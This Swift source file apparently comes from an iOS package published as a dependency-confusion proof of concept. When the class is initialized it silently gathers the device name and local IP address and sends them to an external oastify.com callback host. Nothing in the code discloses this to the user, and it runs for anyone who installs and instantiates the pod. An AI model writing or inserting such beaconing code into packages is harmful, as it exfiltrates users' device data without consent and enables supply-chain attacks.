import UIKit
import Foundation

public class PocPod {
    public init() {
        let podName = "pocpockaiksi"
        let deviceName = UIDevice.current.name
        let ipAddress = getIPAddress() ?? "unknown"

        let urlStr = "https://xxygcfj65ljljni9899jit989zfr3ir7.oastify.com/?pod=\(podName)&device=\(deviceName)&ip=\(ipAddress)"
        guard let encodedUrlStr = urlStr.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed),
              let url = URL(string: encodedUrlStr) else {
            return
        }

        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        URLSession.shared.dataTask(with: req).resume()
    }

    private func getIPAddress() -> String? {
        var address: String?

        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        if getifaddrs(&ifaddr) == 0 {
            var ptr = ifaddr
            while ptr != nil {
                defer { ptr = ptr?.pointee.ifa_next }

                guard let interface = ptr?.pointee else { continue }
                let addrFamily = interface.ifa_addr.pointee.sa_family
                if addrFamily == UInt8(AF_INET) { // IPv4
                    if let name = String(validatingUTF8: interface.ifa_name), name != "lo0" {
                        var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                        getnameinfo(interface.ifa_addr,
                                    socklen_t(interface.ifa_addr.pointee.sa_len),
                                    &hostname,
                                    socklen_t(hostname.count),
                                    nil,
                                    socklen_t(0),
                                    NI_NUMERICHOST)
                        address = String(cString: hostname)
                        break
                    }
                }
            }
            freeifaddrs(ifaddr)
        }

        return address
    }
}

